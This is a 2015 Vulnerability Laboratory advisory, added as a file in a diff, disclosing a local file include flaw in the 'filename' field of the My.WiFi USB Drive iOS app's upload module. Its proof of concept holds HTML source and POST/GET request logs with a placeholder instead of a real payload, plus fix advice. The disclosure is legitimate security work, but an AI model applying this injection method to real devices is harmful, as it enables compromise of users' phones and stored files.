@@ -1,0 +1,212 @@
+Document Title:
+===============
+My.WiFi USB Drive v1.0 iOS - File Include Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1589
+
+
+Release Date:
+=============
+2015-09-24
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1589
+
+
+Common Vulnerability Scoring System:
+====================================
+7.1
+
+
+Product & Service Introduction:
+===============================
+My WiFi USB drive. Files can be uploaded with any browser. Start the WiFi Drive web server from application and connect to it using any browser.
+Use the iPod/iPhone’s/iPad`s available disk space to carry any files. Use your iPhone as a normal shared network drive!
+
+(Copy of the Vendor Homepage: https://itunes.apple.com/us/app/my.wifi-usb-drive-+-free-pdf/id979512705  )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Core Research Team discovered a local file include vulnerability in the official My.WiFi USB Drive v1.0 iOS mobile web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-09-24:	Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Jiyeon Lee
+Product: My.WiFi USB Drive - iOS Mobile (Web-Application) 1.0
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A local file include web vulnerability has been discovered in the official My.WiFi USB Drive v1.0 iOS mobile web-application.
+The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system 
+specific path commands to compromise the mobile web-application.
+
+The web vulnerability is located in the `filename` value of the `Upload Files` module. Remote attackers are able to inject own files with malicious 
+`filename` values in the `Upload Files` POST method request to compromise the mobile web-application. The local file/path include execution occcurs in 
+the index file dir listing of the wifi interface. The attacker is able to inject the local file include request by usage of the `wifi interface` 
+in connection with the vulnerable upload files POST method request. 
+
+Remote attackers are also able to exploit the filename issue in combination with persistent injected script codes to execute different malicious 
+attack requests. The attack vector is located on the application-side of the wifi service and the request method to inject is POST. 
+
+The security risk of the local file include vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 7.1. 
+Exploitation of the local file include web vulnerability requires no user interaction or privilege web-application user account. 
+Successful exploitation of the local file include vulnerability results in mobile application compromise or connected device component compromise.
+
+Request Method(s):
+				[+] [POST]
+
+Vulnerable Module(s):
+				[+] Upload Files
+
+Vulnerable Parameter(s):
+				[+] filename
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost/)
+
+
+Proof of Concept (PoC):
+=======================
+The file include web vulnerability can be exploited by remote attackers without privilege web-application user account or user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC: Source
+<tr class="row-file">
+        <td class="column-icon">
+          
+            <button type="button" class="btn btn-default btn-xs button-open">
+              <span class="glyphicon glyphicon-folder-open"></span>
+            </button>
+        </td>
+        <td class="column-name"><p title="Click to rename..." 
+class="edit">"./[LOCAL FILE INCLUDE VULNERABILITY!]></p></td>
+        <td class="column-size">
+
+
+--- PoC Session Logs [POST] ---
+13:08:40.079[167ms][total 167ms] Status: 200[OK]
+POST http://localhost:8080/upload Load Flags[LOAD_BYPASS_CACHE  ] Größe des Inhalts[2] Mime Type[application/json]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0]
+      Accept[application/json, text/javascript, */*; q=0.01]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/]
+      Content-Length[820]
+      Content-Type[multipart/form-data; boundary=---------------------------20192471318021]
+      Connection[keep-alive]
+      Pragma[no-cache]
+      Cache-Control[no-cache]
+   POST-Daten:
+      POST_DATA[-----------------------------20192471318021
+Content-Disposition: form-data; name="path"
+/
+-----------------------------20192471318021
+Content-Disposition: form-data; name="files[]"; filename="./[LOCAL FILE INCLUDE VULNERABILITY!]2.png"
+Content-Type: image/png
+---
+13:08:42.198[75ms][total 75ms] Status: 200[OK]
+GET http://localhost:8080/list?path=%2F[LOCAL FILE INCLUDE VULNERABILITY]2.png Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[692] Mime Type[application/json]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0]
+      Accept[application/json, text/javascript, */*; q=0.01]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+   Response Header:
+      Server[GCDWebUploader]
+      Cache-Control[no-cache]
+      Content-Length[692]
+      Content-Type[application/json]
+      Connection[Close]
+      Date[Tue, 01 Sep 2015 11:17:22 GMT]
+	  
+
+Reference(s):
+http://localhost:8080/upload
+http://localhost:8080/list?path=%2F
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a secure validation of the filename value in the upload POST method request. Restrict the filename input and 
+disallow special chars. Ensure that not multiple file extensions are loaded in the filename value to prevent arbitrary file upload attacks.
+Encode the output in the file dir index list with the vulnerable name value to prevent application-side script code injection attacks.
+
+
+Security Risk:
+==============
+The security risk of the local file include web vulnerability in the My.WiFi USB Drive app is estimated as high. (CVSS 7.1)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
